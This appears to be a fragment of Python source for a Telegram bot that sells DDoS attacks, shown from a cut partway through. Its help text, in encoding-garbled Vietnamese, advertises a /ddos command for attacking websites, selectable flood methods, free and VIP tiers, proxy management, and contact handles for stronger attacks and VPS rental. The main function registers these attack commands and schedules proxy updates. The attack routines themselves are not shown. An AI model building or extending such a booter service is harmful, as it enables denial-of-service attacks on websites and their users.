    message = '''<blockquote expandable>
<b>H∆∞·ªõng d·∫´n /ddos</b>
üëâ <b>·∫§n xem c√°ch DDOS...</b> üëà

‚ïë üìå VIP /muavipduocgi:
‚ïë ‚Ä¢ /ddos url - T·∫•n c√¥ng website
‚ïë ‚Ä¢ /ddos method url - Ch·ªçn methods
‚ïë ‚Ä¢ /methods - C√°c ph∆∞∆°ng th·ª©c t·∫•n c√¥ng
‚ïë üí° Ph∆∞∆°ng th·ª©c m·∫∑c ƒë·ªãnh - FLOOD
‚ïë
‚ïë üìå FREE /laykey:
‚ïë ‚Ä¢ /ddos url - T·∫•n c√¥ng website
‚ïë ‚Ä¢ M·∫∑c ƒë·ªãnh method l√† FLOOD
‚ïë
‚ïë ADMIN:
‚ïë ‚Ä¢ /taskd - ... on - off
‚ïë ‚Ä¢ /kill - ...
‚ïë ‚Ä¢ /lsd - ...
‚ïë ‚Ä¢ /cpx - ...
‚ïë ‚Ä¢ /addpx - ...
‚ïë ‚Ä¢ /uppx - ...
‚ïë ‚Ä¢ /offd - ...
‚ïë ‚Ä¢ /ond - ...
‚ïë üí° Ddos m·∫°nh h∆°n ib. @tranthanhpho
‚ïë üí° Thu√™ vps ib. @NeganSSHConsole
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê</blockquote>'''

    await update.message.reply_text(message, parse_mode='HTML')


onitoring_task = None
async def start_monitoring(application: Application):
   """Start monitoring task on bot startup"""
   global monitoring_task
   try:
       if not monitoring_task or monitoring_task.removed:
           monitoring_task = application.job_queue.run_repeating(
               send_monitoring_info,
               interval=15,  # 15 gi√¢y g·ª≠i c√°i
               first=1,
               name='system_monitoring'
           )
           logger.info("Monitoring task started automatically on startup")
   except Exception as e:
       logger.error(f"Error starting monitoring task: {e}")



def main():
    try:
        logger.info("Starting bot initialization...")
        kill_all_processes()
        logger.info("Building application...")
        application = Application.builder().token(TOKEN).build()
        
        logger.info("Adding command handlers...")
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("ddos", ddos))
        application.add_handler(CommandHandler("killd", kill_ddos))
        application.add_handler(CommandHandler("addpx", add_proxy))
        application.add_handler(CommandHandler("uppx", update_proxy_new))
        application.add_handler(CallbackQueryHandler(handle_status_check, pattern="^st_"))
        application.add_handler(CommandHandler("offd", bot_off))
        application.add_handler(CommandHandler("ond", bot_on))
        application.add_handler(CommandHandler("taskd", task))
        application.add_handler(CommandHandler("lsd", list_processes))
        application.add_handler(CommandHandler("methods", methods))
        application.add_handler(CommandHandler("rsd", restart_bot))
        application.add_handler(CommandHandler("cpx", check_proxy_cron_status))
        logger.info("Setting up job queue...")
        job_queue = application.job_queue
        job_queue.run_repeating(
            callback=check_and_update_proxy,
            interval=1800,
            first=1,
            name='proxy_update'
        )
        
        logger.info("Adding error handler...")
        application.add_error_handler(error_handler)
        # G·ª≠i th√¥ng b√°o kh·ªüi ƒë·ªông n·∫øu ƒë∆∞·ª£c (ko l·ªói)
        application.job_queue.run_once(
        lambda context: asyncio.create_task(send_restart_notification(application)),
        when=1  # ƒê·ª£i 1 gi√¢y sau khi kh·ªüi ƒë·ªông
        )
        # Th√™m proxy cron v√†o startup tasks
        application.job_queue.run_once(
            lambda context: asyncio.create_task(start_proxy_cron(application)),
            when=3  # Ch·∫°y sau 5 gi√¢y ƒë·ªÉ ƒë·∫£m b·∫£o bot ƒë√£ kh·ªüi ƒë·ªông ho√†n to√†n
        )
        application.job_queue.run_once(
           lambda context: asyncio.create_task(start_monitoring(application)),
           when=5  # Ch·∫°y sau 5 gi√¢y
       )
        logger.info("Setting up cleanup...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(cleanup_attacks())
        
        logger.info("Starting polling...")
        application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
        
    except Exception as e:
        logger.error(f"Error in main: {e}", exc_info=True)
        raise


if __name__ == '__main__':
    try:
        logger.info("Starting main program...")
        observer = Observer()
        handler = ReloadOnChangeHandler(lambda: os.execl(sys.executable, sys.executable, *sys.argv))
        observer.schedule(handler, path='.', recursive=False)
        
        logger.info("Starting file observer...")
        observer.start()
        
        logger.info("Calling main function...")
        main()
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt, stopping...")
        observer.stop()
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)
    finally:
        logger.info("Joining observer thread...")
        observer.join()